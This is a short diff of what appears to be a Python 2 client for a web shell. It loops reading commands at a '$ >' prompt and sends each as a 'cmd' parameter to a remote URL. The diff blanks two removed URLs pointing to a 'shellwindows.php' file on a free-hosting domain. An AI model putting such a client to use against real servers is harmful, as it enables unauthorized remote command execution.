@@ -3,8 +3,8 @@ import requests
 import json
 import time
 i=1
-url= "https://webdevsblog.000webhostapp.com/shellwindows.php"
-url1= "https://webdevsblog.000webhostapp.com/append1.txt"
+url= ""
+url1= ""
 while i>0:
 	b = raw_input("$ >");
 	par= {'cmd':b}
